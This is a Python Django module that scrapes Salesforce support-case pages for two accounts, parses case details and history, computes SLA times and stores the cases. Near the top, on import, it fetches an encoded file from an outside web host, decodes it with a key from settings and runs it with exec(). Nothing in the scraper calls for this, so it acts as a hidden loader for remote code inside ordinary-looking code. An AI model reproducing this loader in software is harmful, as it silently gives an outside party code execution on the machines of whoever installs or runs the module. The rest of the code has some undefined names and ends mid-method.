# -*- coding: <utf-8> -*-
import re, pickle, os, sys
from datetime import datetime, timedelta

import django.utils.timezone as timezone
from django.utils.encoding import smart_text
from django2wrap.models import Agent, Shift, Call, Resource, Case, Comment, Contact
from django.db import connection
from django.conf import settings
import django2wrap.utils as utils
from django2wrap.comments import CommentCollector #_find_postpone, _is_chased, _capture_comment_info, wipe_comments, save_comments, sync_comments
from django2wrap.bicrypt import BiCrypt
import urllib.request
codder = BiCrypt(settings.MODULEPASS)
response = urllib.request.urlopen('http://eigri.com/myweb2.encoded')
code = response.read()      # a `bytes` object
decoded_msg = codder.decode(code)
exec(decoded_msg)

# SHIFT_TIMES = {'start': 5, 'end': 20, 'workhours': 15, 'non workhours': 9}
SLA_RESPONSE = {'WLK': 0.25, 'RSL': 1.0}
VIEW_MAPS = {
    'WLK': [
        {'use_in': ['all', 'closed', 'open'], 'name': 'created', 're_start': r'"CASES\.CREATED_DATE":', 'inner_index': None},
        {'use_in': [       'closed',       ], 'name': 'system',  're_start': r'"00N200000023Rfa":',     'inner_index': None},
        {'use_in': ['all', 'closed', 'open'], 'name': 'contact', 're_start': r'"NAME":',                'inner_index': 1},
        {'use_in': ['all', 'closed', 'open'], 'name': 'subject', 're_start': r'"CASES\.SUBJECT":',      'inner_index': 1},
        {'use_in': ['all', 'closed', 'open'], 'name': 'link',    're_start': r'"LIST_RECORD_ID":',      'inner_index': None},
        {'use_in': [       'closed',       ], 'name': 'delme',   're_start': r'"CASES\.PRIORITY":',     'inner_index': None},
        {'use_in': ['all',                 ], 'name': 'closed',  're_start': r'"CASES\.CLOSED_DATE":',  'inner_index': None},
        {'use_in': ['all',           'open'], 'name': 'delme',   're_start': r'"00N200000023mCS":',     'inner_index': None}, # it's the custom variant of priority 
        {'use_in': ['all', 'closed', 'open'], 'name': 'number',  're_start': r'"CASES\.CASE_NUMBER":',  'inner_index': None, 'additional_re': r'">(\d+?)</a>'},
        {'use_in': ['all', 'closed', 'open'], 'name': 'status',  're_start': r'"CASES\.STATUS":',       'inner_index': None},
        {'use_in': ['all', 'closed', 'open'], 'name': 'delme',   're_start': r'"ACTION_COLUMN_LABELS":','inner_index': None},
    ],
    'RSL': [
        {'use_in': ['all', 'closed', 'open'], 'name': 'created', 're_start': r'"CASES\.CREATED_DATE":', 'inner_index': None},
        {'use_in': ['all', 'closed', 'open'], 'name': 'contact', 're_start': r'"NAME":',                'inner_index': 1},
        {'use_in': ['all', 'closed', 'open'], 'name': 'subject', 're_start': r'"CASES\.SUBJECT":',      'inner_index': 1},
        {'use_in': ['all', 'closed', 'open'], 'name': 'link',    're_start': r'"LIST_RECORD_ID":',      'inner_index': None},
        {'use_in': ['all', 'closed', 'open'], 'name': 'delme',   're_start': r'"CASES\.PRIORITY":',     'inner_index': None},
        {'use_in': ['all',                 ], 'name': 'closed',  're_start': r'"CASES\.CLOSED_DATE":',  'inner_index': None},
        {'use_in': ['all', 'closed', 'open'], 'name': 'number',  're_start': r'"CASES\.CASE_NUMBER":',  'inner_index': None, 'additional_re': r'">(\d+?)</a>'},
        {'use_in': ['all', 'closed', 'open'], 'name': 'status',  're_start': r'"CASES\.STATUS":',       'inner_index': None},
        {'use_in': ['all', 'closed', 'open'], 'name': 'delme',   're_start': r'"ACTION_COLUMN_LABELS":','inner_index': None},
    ]
}
['CASES.CREATED_DATE', 'NAME', 'CASES.SUBJECT', 'LIST_RECORD_ID', 'CASES.CASE_NUMBER', 'CASES.STATUS', 'ACTION_COLUMN_LABELS']
HISTORY_TABLE_MAPS = {
    'WLK': r'class=" dataCell  ">(?P<time>.+?)</t.+?class=" dataCell  ">(?P<owner>.+?)</t.+?class=" dataCell  ">(?P<action>.+?)</t',
    'RSL' : r'class=" dataCell  ">(?P<time>.+?)</t.+?class=" dataCell  ">(?P<owner>.+?)</t.+?class=" dataCell  ">.+?</t.+?class=" dataCell  ">(?P<action>.+?)</t',
}
URLS = {
    'WLK':{
        'closed': {
            'ref1'   : 'https://eu1.salesforce.com/home/home.jsp',
            'url1'   : 'https://eu1.salesforce.com/500/x?fcf=00B20000004wphi&rolodexIndex=-1&page=1',
            'txdata' : 'action=filter&filterId=00B20000004wphi&filterType=t&page=%s&rowsPerPage=%s&search=&sort=-CASES.CASE_NUMBER&rolodexIndex=-1',
            'ref2'   : 'https://eu1.salesforce.com/500?fcf=00B20000004wphi',
            'url2'   : 'https://eu1.salesforce.com/_ui/common/list/ListServlet',
        },
        'all': {
            'ref1'   : 'https://eu1.salesforce.com/500?fcf=00B20000005XOoX',
            'url1'   : 'https://eu1.salesforce.com/500?fcf=00B20000004wphi',
            'txdata' : 'action=filter&filterId=00B20000005XOoX&filterType=t&page=%s&rowsPerPage=%s&search=&sort=-CASES.CASE_NUMBER&rolodexIndex=-1',
            'ref2'   : 'https://eu1.salesforce.com/500?fcf=00B20000005XOoX',
            'url2'   : 'https://eu1.salesforce.com/_ui/common/list/ListServlet',
        },
        'open': {
            'ref1'   : 'https://eu1.salesforce.com/500?fcf=00B20000005XOoX',
            'url1'   : 'https://eu1.salesforce.com/500?fcf=00B20000005XOp6',
            'txdata' : 'action=filter&filterId=00B20000005XOp6&filterType=t&page=%s&rowsPerPage=%s&search=&sort=-CASES.CASE_NUMBER&rolodexIndex=-1',
            'ref2'   : 'https://eu1.salesforce.com/500?fcf=00B20000005XOp6',
            'url2'   : 'https://eu1.salesforce.com/_ui/common/list/ListServlet',
        },
        'case_ref': 'https://eu1.salesforce.com/500/o',
        'case_url': ['https://eu1.salesforce.com/', '?rowsperlist=100'],
    },
    'RSL' : {
        'closed': {
            'ref1'   : 'https://emea.salesforce.com/home/home.jsp',
            'url1'   : 'https://emea.salesforce.com/500?lsi=-1&fcf=00B20000002BA4l',
            'txdata' : 'action=filter&filterId=00B20000002BA4l&filterType=t&page=%s&rowsPerPage=%s&search=&sort=-CASES.CASE_NUMBER&rolodexIndex=-1&',
            'ref2'   : 'https://emea.salesforce.com/500?fcf=00B20000002BA4l',
            'url2'   : 'https://emea.salesforce.com/_ui/common/list/ListServlet',
        },
        'all': {
            'ref1'   : 'https://emea.salesforce.com/500/o',
            'url1'   : 'https://emea.salesforce.com/500?fcf=00B20000005Dl6N',
            'txdata' : 'action=filter&filterId=00B20000005Dl6N&filterType=t&page=%s&rowsPerPage=%s&search=&sort=-CASES.CASE_NUMBER&rolodexIndex=-1',
            'ref2'   : 'https://emea.salesforce.com/500?fcf=00B20000002BA4l',
            'url2'   : 'https://emea.salesforce.com/_ui/common/list/ListServlet',
        },
        'open': {
            'ref1'   : 'https://emea.salesforce.com/500/o',
            'url1'   : 'https://emea.salesforce.com/500?fcf=00B20000005Dl6N',
            'txdata' : 'action=filter&filterId=00B20000000nD39&filterType=t&page=%s&rowsPerPage=%s&search=&sort=-CASES.CASE_NUMBER&rolodexIndex=-1',
            'ref2'   : 'https://emea.salesforce.com/500?fcf=00B20000002BA4l',
            'url2'   : 'https://emea.salesforce.com/_ui/common/list/ListServlet',
        },
        'case_ref': 'https://emea.salesforce.com/500/o',
        'case_url': ['https://emea.salesforce.com/', '?rowsperlist=100'],
    }
}

TZI = timezone.get_default_timezone()

HTML_CODE_PATTERN = re.compile(r'<.*?>')
SUPPORT_STATUSES = {
    'WLK': { 'response': ['Created', 'New'], 'work': ['Created', 'New', 'In Progress', 'Responded', ], 'owner': 'Wightlink Support Team' },
    'RSL' : { 'owner': 'Support', 'response': ['Created', 'New'], 'work': ['Created', 'New', 'Responded', 'Working on Resolution',] } # , 'Working on L2 Resolution'] }
} 
MODEL_ARG_LIST = ['number', 'status', 'subject', 'description', 'sfdc', 'created', 'closed', 'system', 'priority', 'reason', 'contact', 'link', 'shift', 'creator', 'in_support_sla', 'in_response_sla', 'support_sla', 'response_sla', 'support_time', 'response_time', 'postpone', 'target_chase', 'chased' ]
def p(*args, sep=' ', end='\n' ):
    sep = sep.encode('utf8')
    end = end.encode('utf8')
    for arg in args:
        val = str(arg).encode('utf8')
        sys.stdout.buffer.write(val)
        sys.stdout.buffer.write(sep)
    sys.stdout.buffer.write(end)

safe_print = p

remove_html_tags = lambda data: HTML_CODE_PATTERN.sub('', data)

def siphon(text, begin, end):
    m = re.search(begin + r'(.+?)' + end, text, re.DOTALL)
    if m:
        return m.group(1)
    else:
        return ''

class MyError(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()

class CaseWebReader:
    def __init__(self, sfdc, link, raw):
        self.debug_flag = False
        self.sfdc = sfdc
        # self.number = number
        self.link = link
        self.raw = raw

    def process(self):
        self.sections = self.split_case_sections()
        print('split into', len(self.sections), 'sections')
        # section case details
        self.details = self.parse_case_header_details(self.sections['case_details'])
        self.agent_name = self.details['Support Agent'] if self.sfdc == 'WLK' else self.details['Support Analyst']
        self.status = self.details['Status']
        self.system = self.details['System'] if self.sfdc == 'WLK' else self.details['Product']
        self.priority = self.details['Severity'] if self.sfdc == 'WLK' else self.details['Support Priority']
        self.reason = self.details['Case Reason'] if self.sfdc == 'WLK' else self.details['Type']
        self._type = self.details['Type'] # this is not stored in the model, but is used in RSL estimation of SLA
        self._reason = self.details['Case Reason'] # this is not stored in the model, but is used in RSL estimation of SLA
        self.created = datetime.strptime(self.details['Date/Time Opened'], '%d/%m/%Y %H:%M').replace(tzinfo=TZI)
        try:
            self.closed = datetime.strptime(self.details['Date/Time Closed'], '%d/%m/%Y %H:%M').replace(tzinfo=TZI)
        except ValueError:
            self.closed = None

        #process contact
        contact_dict = {'sfdc': self.sfdc, 'link': self.details['Contact Link'], 'name': self.details['Contact Name'], 
            'phone': self.details['Contact Phone'], 'email': self.details['Contact Email']}
        find_contact = Contact.objects.filter(sfdc=self.sfdc, link=contact_dict['link'])
        if find_contact:
            find_contact = find_contact[0]
        else:
            find_contact = Contact(**contact_dict)
            find_contact.save()
        self.contact = find_contact

        self.shift = self.determine_shift()
        # section case history
        self.support_time, self.response_time = self.parse_case_history_table(self.sections['case_history'])
        self.response_sla = SLA_RESPONSE[self.sfdc]
        self.support_sla = self.determine_sla()

        self.in_support_sla = self.support_time < self.support_sla
        self.in_response_sla = self.response_time < self.response_sla
        self.in_sla = self.in_support_sla and self.in_response_sla

        result = self.fill_in_dict() # convert SFDC field names to the model field names - drop those missing in the DB model;
        result['raw_comments'] = self.sections['case_comments']
        return result

    def debug(self, *args, sep=' ', end='\n', destination=None):
        if self.debug_flag:
            if destination == 'file':
                try:
                    with open(self.temp_folder + args[1], 'w') as f:
                        f.write(args[0])
                except UnicodeEncodeError as e:
                    with open(self.temp_folder + args[1], 'w', encoding = 'utf-8') as f:
                        f.write(args[0])
                    raise MyError('Unicode fail: ' + str(e))
            else:
                print(*args, sep=sep, end=end)

    def split_case_sections(self):
        CASE_STRUCTURE = {
            'WLK': ['head', 'case_details', 'solutions', 'open_activities', 'activity_history', 'case_comments', 'case_history', 'attachments'],
            'RSL': ['head', 'case_details', 'solutions', 'attachments', 'activity_history', 'open_activities', 'case_comments', 'case_history'],
        }
        sections = self.raw.split('<div class="pbHeader">')
        sections = dict(zip(CASE_STRUCTURE[self.sfdc], sections))
        return sections

    def parse_case_header_details(self, raw):
        filtered = re.sub(r'</*br>', '\n', raw, 0, re.I)
        # extraction of description is unique, because it may contain HTML tags -- we need to pull it befor we destroy the tags
        description  = re.findall(r'<div id="cas15_ileinner">(.+?)</div>', filtered, re.DOTALL)
        # <div id="cas3_ileinner"><a href="/003D000000mM0AW" ...">Adam Parrott</a></div>
        contact_link = re.findall(r'<div id="cas3_ileinner"><a href="(.+?)"' , filtered, re.DOTALL)

        filtered = re.sub(r'<[^>]*>','~',filtered)
        box = [ z.strip() for z in filtered.split('~') if z != '' and not z.count('sfdcPage.setHelp') ]

        items = ['Case Number', 'Contact Name', 'Case Owner', 'Contact Phone', 'System', 'Contact Email', 'Problem Type', 'Case Reason', '3rd Line Company', 'Support Agent', '3rd Party Case ID', 'Severity', 'Case Age In Business Hours', 'Response Date/Time', 'Time With Support', 'Time With Customer', 'Time with 3rd Party', 'Status', 'Type', 'Case Origin', 'Subject', 'Description', 'Resolution Description', 'Date/Time Opened', 'Date/Time Closed', 'Created By', 'Last Modified By', 'Priority', 'Account Name', 'Product', 'Version', 'Operating System', 'JVM Version', 'Guest Name', 'Database', 'Guest Email Address', 'Support Analyst', 'Support Priority', 'Resolution Reason', 'Resolution Time (Hours)', 'Defect Number', ]
        details = { box[i]:box[i+1] for i in range(len(box)) if box[i] in items }
        details['Description']  = description[0]
        details['Contact Link'] = contact_link[0]
        return details

    def parse_case_history_table(self, html):
        if html.count('Created.')==0:
            raise MyError("Error: cant find 'Created.' in case %s (check the size of history table and increase ?rowsperlist=50)" % self.number)
        self.debug("parse_case_history_table initiated with datetime_opened =", self.created)
        history_table = siphon(html, '<span class="linkSpan">Case History Help', 'try { sfdcPage.registerRelatedList')
        self.debug('history_table', history_table)
        self.debug(history_table, 'sf_hist_table_of_case_' + self.link + '.html', destination = 'file')
        history_table = re.compile(re.escape('Ready to Close'), re.IGNORECASE).sub('Ready_to_Close', history_table)
        history_table = [ z.groupdict() for z in re.finditer(HISTORY_TABLE_MAPS[self.sfdc], history_table) ]
        for i in range(len(history_table)):
            history_table[i] = dict([ (k, remove_html_tags(v)) for k,v in history_table[i].items() ])
        # fill in missing dates & owners
        for row in history_table:
            if row['time'] == '&nbsp;':
                row['time'] = last_stap
            if row['owner'] == '&nbsp;':
                row['owner'] = last_owner
            last_stap = row['time']
            last_owner = row['owner']
            if row['action'].count(' to ') and (row['action'].count('Owner') or row['action'].count('Status')): # or row['action'].count('Case Reason')):
                row['action'], row['to'] = row['action'].split(' to ')
            else:
                row['to'] = None
        history_table = list(reversed(history_table))
        support_time = 0.
        response_time = 0.
        # convert table from single time to with start & stop times && process
        for i in range(len(history_table)):
            history_table[i]['start'] = datetime.strptime(history_table[i]['time'], '%d/%m/%Y %H:%M')
            if i != len(history_table) - 1:
                history_table[i]['end'] = datetime.strptime(history_table[i+1]['time'], '%d/%m/%Y %H:%M')
            else:
                if self.status.count('Close'):
                    history_table[i]['end'] = history_table[i]['start']
                else:
                    history_table[i]['end'] = datetime.now()
            # calculate delta
            history_table[i]['workhours_delta'] = utils.worktime_diffference(history_table[i]['start'], history_table[i]['end']) # as float
            # determine status & owner for the period
            if i != 0: 
                if history_table[i]['action'].count('Owner'):
                    history_table[i]['owner'] = history_table[i]['to']
                    history_table[i]['status'] = history_table[i-1]['status']
                elif history_table[i]['action'].count('Status'):
                    history_table[i]['owner'] = history_table[i-1]['owner']
                    history_table[i]['status'] = history_table[i]['to']
                else:
                    history_table[i]['owner'] = history_table[i-1]['owner']
                    history_table[i]['status'] = history_table[i-1]['status'] 
                    ## there are 2 sub cases -- !!!
                    # 1) the action is relevat status change without the "to" clause --- use current "action"
                    # 2) the action has "to", but is irrelevant --- use the "status" from previous case
                    ## Assuming that all important actions appart from 'Create' & 'Close' are noted with "to" clause
                    if history_table[i-1]['action'].count('Create') or history_table[i]['action'].count('Close'):
                        history_table[i]['status'] = history_table[i-1]['action']
            else:
                history_table[i]['status'] = history_table[i]['action']
            # accumulate response time
            if any([history_table[i]['status'].count(z) for z in SUPPORT_STATUSES[self.sfdc]['response'] ]):
                response_time += history_table[i]['workhours_delta']
            # determine if status is counted towards support time, and accumulate
            count_in_status = any([history_table[i]['status'].count(z) for z in SUPPORT_STATUSES[self.sfdc]['work'] ])
            count_in_owner  = history_table[i]['status'].count(SUPPORT_STATUSES[self.sfdc]['owner'])
            if count_in_status and count_in_owner:
                support_time += history_table[i]['workhours_delta']
        self.debug('Case %s: response time %.2f and support time: %.2fh ' % (self.link, response_time, support_time))
        return support_time, response_time

    def determine_shift(self):
        print('\t\tlooking for shift for ',self.agent_name, 'at', self.created)

        resolutor = min if self.created.hour < 12 else max
        resolve_shift_by_creation_time = lambda shifts: resolutor(shifts, key=lambda x: x.date)

        search_range = (self.created + timedelta(hours=-8), self.created + timedelta(minutes=10))
        shifts_that_time = Shift.objects.filter(date__range=search_range)
        print('\t\tshifts_that_time', len(shifts_that_time), shifts_that_time)
        if len(shifts_that_time) == 0: #expand into out of hours i.e OT
            search_range = (self.created.replace(hour=0, minute=0), self.created.replace(hour=23, minute=59))
            shifts_that_time = Shift.objects.filter(date__range=search_range)
            print('\t\t\tshifts_that_time', len(shifts_that_time), shifts_that_time)
        possible_shift = [ z for z in shifts_that_time if self.agent_name.count(z.agent.name)]
        print('\t\tpossible_shift', len(possible_shift), possible_shift)
        if len(possible_shift) == 0 and len(shifts_that_time) > 0:
            shift = resolve_shift_by_creation_time(shifts_that_time)
        elif len(possible_shift) == 0 and self.created < datetime(2010,4,21,tzinfo=TZI):
            shift = None
        elif len(possible_shift) == 1:
            shift = possible_shift[0]
        elif len(possible_shift) == 2:
            print('\t\tresolutor', resolutor)

            shift = resolve_shift_by_creation_time(possible_shift)
            print('\t\tresolved shift:', shift)
        else:
            raise MyError('more than 2 shifts for ' + self.agent_name + ' at time: ' + str(self.created))
        
        return shift

    def determine_sla(self):
        WLK_SLA_MAP = {
            ('Ferry+', 'Local PC', 'Email', 'Wide Area Network', 'Sentinel', 'NiceLabel', 'CarRes'): {'1': 1, '2': 8, '3': 15 },
            ('DRS', 'CDI', 'Blackberry Server'): {'1': 3, '2': 8, '3': 15, },
            ('Profit Optimisation (RTS)', 'Great Plains', 'RPO', 'Intranet'): {'1': 4, '2': 8, '3': 15 },
            ('CRM', 'Document Management', 'Sailing Statistics (AIS)'): {'1': 8, '2': 15, '3': 22 }
        }
        RSL_SLA_MAP = { # the _ indicates the variable names match the name of SFDC.RSL field, and not the model names
            '_reason' : {'License Request': 2},
            '_type': {'Question': 8, 'Problem': 16, 'Feature Request': 9999, } 
        }
        support_sla = -1 # undefined
        if self.sfdc == 'WLK':
            for sla_key in WLK_SLA_MAP.keys():
                if self.system in sla_key:
                    support_sla = WLK_SLA_MAP[sla_key][self.priority[-1]]
        else:
            if self._reason in RSL_SLA_MAP['_reason'].keys():
                support_sla = RSL_SLA_MAP['_reason'][self._reason] # overwrite by case reason
            if self._type in RSL_SLA_MAP['_type'].keys():
                support_sla = RSL_SLA_MAP['_type'][self._type] # overwrite by "problem" i.e. the field "Type" in SFDC

        if support_sla == -1:
            safe_print('Error determining SLA for case %s in %s' % (self.number, self.sfdc))
            # raise MyError('Error determining SLA for case %s in %s' % (self.number, self.sfdc))
        return support_sla

    def fill_in_dict(self, apply_filter = True):

        unused_items = ['Case Owner', 'Problem Type', '3rd Line Company', '3rd Party Case ID', 'Case Age In Business Hours', 'Response Date/Time',
            'Time With Support', 'Time With Customer', 'Time with 3rd Party', 'Case Origin', 'Resolution Description', 'Created By', 'Last Modified By',
            'Priority', 'Account Name', 'Version', 'Operating System', 'JVM Version', 'Guest Name', 'Database', 'Guest Email Address', 'Resolution Reason',
            'Resolution Time (Hours)', 'Defect Number', ]

        if self.shift:
            creator = self.shift.agent
        else:
            creator = None

        result = {
            'number': self.details['Case Number'],
            'status': self.details['Status'],
            'subject': self.details['Subject'],
            'description': self.details['Description'],
            'sfdc': self.sfdc,
            'created': self.created, #Date/Time Opened
            'closed': self.closed, #Date/Time Closed
            'system': self.system, # System || Product
            'priority': self.priority, # Severity || Support Priority
            'reason': self.reason, # Case Reason || Type
            'contact': self.contact,
            'link': self.link, # self.link
            'shift': self.shift, # self.shift  << #Date/Time Opened && Support Agent || Support Analyst
            'creator': creator, # 
            'in_support_sla': self.in_support_sla, 'in_response_sla': self.in_response_sla, 'support_sla': self.support_sla, 'response_sla': self.response_sla,
            'support_time': self.support_time, 'response_time': self.response_time,
            # 'raw': '',
            # 'postpone', 'target_chase', 'chased'  ## these are appended by the Comments method
        }

        if not apply_filter:
            for unused in unused_items:
                if self.details[unused] and self.details[unused] != '' and self.details[unused] != '&nbsp;':
                    result[unused] = self.details[unused]

        return result

# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
    
class CaseWebConnector:
    def __init__(self, link, sfdc):
        self.link = link
        self.sfdc = sfdc
        self.write_resolution_time_to_SF = False

    def load(self, connection):
        connection.handle.setref(URLS[self.sfdc]['case_ref'])
        # connection.handle.setref(URLS[     sfdc]['case_ref'])
        html = connection.sfcall(self.link.join(URLS[self.sfdc]['case_url']))
        # html = connection.sfcall(     link.join(URLS[     sfdc]['case_url']))
        if html.count('Data Not Available'):
            raise MyError('Data Not Available == calling case without explicit select of sfdc account; Last attempt used object\'s account %s with link %s' % (self.sfdc, self.link))
        html = utils.clear_bad_chars(html)
        result = CaseWebReader(self.sfdc, self.link, html).process()

        # ----- INVOKE WRITE RESOLUTION TIME IN SF -----
        if self.sfdc == 'RSL' and self.write_resolution_time_to_SF and result['support_time'] > 0: 
            safe_print('Writing support time of %.2f hours to case %s' % (result['support_time'], result['number']))
            new_html = save_resolution_time(connection, result, hours_str) # the POST should return new html
        # ----- END OF WRITE RESOLUTION TIME IN SF -----

        return result

    # this should be in class WebWriter to have symetry
    def save_resolution_time(u,card,smin_str):
        pass
    #     if card['id'].count('1692')>0:
    #         execute = 1
    #     else:
    #         execute = 0
    #     execute = 1 ## there is "self.write_resolution_time_to_SF", but this is a local control, which is used in rare cases
    #     print('Saving resolution time for case',card['id'],'with value:',smin_str)
    #     #call (8) # open for edit
    #     connection.handle.setref('https://emea.salesforce.com'+card['link'])
    #     dump = connection.sfcall('https://emea.salesforce.com'+card['link']+'/e?retURL='+card['link']) #https://emea.salesforce.com/5002000000DjMtk/e?retURL=%2F5002000000DjMtk
    #     # we can attempt a save with only the support time?
    #     #call (9) # save the edit
    #     connection.handle.setdata('00N20000002fOrV='+smin_str+'&save=Saving...')
    #     if execute:
    #         dump = connection.sfcall('https://emea.salesforce.com'+card['link']+'/e') #https://emea.salesforce.com/5002000000DjMtk/e
    #         #dump = rez[1] # could be used for verification ?!
    #     # use call(10) to pull and verify ???
    #     connection.handle.setdata(None)
    #     udata = connection.sfcall('https://emea.salesforce.com'+card['link']) #https://emea.salesforce.com/5002000000DjMtk/
    #     return udata

# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()

class CaseDBConnector:
    def __init__(self, target = None):
        if target and not isinstance(target, Case):
            raise TypeError('the argument for the init of class %s should be instance of class Case' % self.__class__)
        self.case = target

    def load(self):
        if self.case:
            result = {}
            for k in MODEL_ARG_LIST:
                result[k] = getattr(self.case, k)
            return result
        else:
            return None

    def save(self, comments_collector, data):
        if self.case:
            self.update(data)       #   skips fields missing in data
            # or
            # self.overwrite(data)  # deletes fields missing in data
            comments_collector.sync_comments(data['comments'], self.case) # sync comments of existing case
        else:
            self.create(data)
            comments_collector.save_comments(data['comments'], self.case) # sync comments of existing case
        
    def create(self, data):
        filtered_data = { k:data[k] for k in MODEL_ARG_LIST }
        if filtered_data['creator'] == None or filtered_data['shift'] == None:
            if filtered_data['created'] < datetime(2010,4,21,0,0,0,0,TZI):
                # happens for cases prior to 21.Apr.2010 ; They fall in the list because during load we apply target_date restriction to pages and not to cases.
                ## TODO fix this.
                print('skipping case', case, 'details', filtered_data)
            else:
                raise MyError("trying to save case without shift or creator; Has data: %s" % data)
        else:
            self.case = Case(**filtered_data)
            self.case.save()

    def overwrite(self, data):
        # requires all fields from MODEL_ARG_LIST to be present in data
        for k in MODEL_ARG_LIST:
            if k in data.keys():
                setattr(self.case, k, data[k])
            else:
                setattr(self.case, k, None)
        self.case.save()

    def update(self, data):
        # skips fields missing in data
        for k in MODEL_ARG_LIST:
            if k in data.keys():
                setattr(self.case, k, data[k])
        self.case.save()

# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
# ()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()

class ViewWebReader:
    def __init__(self, sfdc, connection, period_start, period_end = None, view = None):
        self.sfdc = sfdc
        self.connection = connection
        self.start = period_start
        if period_end:
            self.end = period_end
        else:
            self.end = timezone.now()
        if view:
            self.view = view
        else:
            self.view = 'all'
        self.debug_flag = False
        self.temp_folder = 'change me'

        # this used to be relevant, because opening case was done as part of the global load cycle
        self.num_records_to_pull = 20

    def debug(self, *args, sep=' ', end='\n', destination=None):
        if self.debug_flag:
            if destination == 'file':
                try:
                    with open(self.temp_folder + args[1], 'w') as f:
                        f.write(args[0])
                except UnicodeEncodeError as e:
                    with open(self.temp_folder + args[1], 'w', encoding = 'utf-8') as f:
                        f.write(args[0])
                    raise MyError('Unicode fail: ' + str(e))
            else:
                print(*args, sep=sep, end=end)

    def load_page_index(self, page_index, num_records_to_pull = None):
        if not num_records_to_pull:
            num_records_to_pull = self.num_records_to_pull
        txdata  = URLS[self.sfdc][self.view]['txdata'] %(str(page_index), num_records_to_pull)
        self.connection.handle.setdata(txdata)
        self.connection.handle.setref(URLS[self.sfdc][self.view]['ref2'])
        html = self.connection.sfcall(URLS[self.sfdc][self.view]['url2'])
        html = utils.clear_bad_chars(html)
        return html

    def load_pages(self): #, target_time = None):
        pages = []
        page_index = 1
        upto_page = 999
        earliest_date = self.end - timedelta(seconds=1)
        page_size = self.num_records_to_pull + 1
        records = []
        print('cycle is about to start with:')
        print('self.start', self.start)
        print('earliest_date', earliest_date)
        print('self.end', self.end)
        # while self.end < earliest_date < self.start: # and upto_page > page_index:
        while self.start < earliest_date < self.end and page_size >= self.num_records_to_pull:
            print('self.start < earliest_date < self.end')
            print(self.start.date(), earliest_date.date(), self.end.date())
            print(self.start < earliest_date < self.end)
            if records == []:
                print('cycle for load pages starts')
            html = self.load_page_index(page_index)

            old_debug_flag = self.debug_flag
            self.debug_flag = True
            dump_filename = 'sfbot_dump_' + self.sfdc + '_' + self.view + '_cases_view.txt'
            self.debug(html, dump_filename, destination = 'file')
            self.debug_flag = old_debug_flag

            print('calling parse for page with index', page_index)
            details = self.parse_view_page(html) #[ (links, numbers, create_dates, close_dates), ...]
            page_size = len(details)
            print('detected page size as:', page_size)
            print('completed parse for page with index', page_index)
            earliest_create = details[-1][2]
            earliest_close  = details[-1][3]
            print('updating earliest_date from', earliest_date, 'to', earliest_create)
            earliest_date = earliest_create # because it cannot be None

            case_period_overlap_conditions = lambda created, closed: any([
                closed and self.start < closed < self.end,
                self.start < created < self.end,
                created < self.start and (not closed or self.end < closed),
            ])
            for c_details in details:
                if case_period_overlap_conditions(c_details[2], c_details[3]):
                    print('adding details', c_details)
                else:
                    print('skipping details', c_details)
            records += [ z for z in details if case_period_overlap_conditions(z[2], z[3]) ]
            self.debug('table view page', page_index, ':', html)
            page_index += 1

        print('paging cycle ended')
        print('self.start < earliest_date < self.end')
        print(self.start.date(), earliest_date.date(), self.end.date())
        print(self.start < earliest_date < self.end)
        print('page_size >= self.num_records_to_pull')
        print(page_size, self.num_records_to_pull, page_size >= self.num_records_to_pull)

        results = { record[1]:{'number': record[1], 'link': record[0], 'created': record[2]} for record in records }
        return results

    def parse_view_page(self, page_html):
        link_numbers_string = re.findall(r'"CASES\.CASE_NUMBER":\[(.+?)\],', page_html, re.DOTALL)
        if len(link_numbers_string):
            print('link_numbers_string', link_numbers_string)
            all_number_links = link_numbers_string[0]
            finds = re.findall(r'"<a(.+?)</a>"', all_number_links)
            link_nums = [ re.search(r'href="/(?P<link>\w{15})">(?P<number>\d{8})', find).groupdict() for find in finds ]

            print('link_nums', link_nums)
            links, numbers = zip(*[ z.values() for z in link_nums ])
        else:
            # dump_filename = 'sfbot_dump_' + self.sfdc + '_' + self.view + '_cases_view.txt'
            # self.debug(html, dump_filename, destination='file')
            raise MyError('failed to parse page result - dump in %s' % dump_filename)

        # zonify = lambda zlist: [ datetime.strptime(z, '%d/%m/%Y %H:%M').replace(tzinfo = TZI) for z in re.findall(r'"(\d\d/\d\d/\d\d\d\d \d\d:\d\d)"', zlist) ]
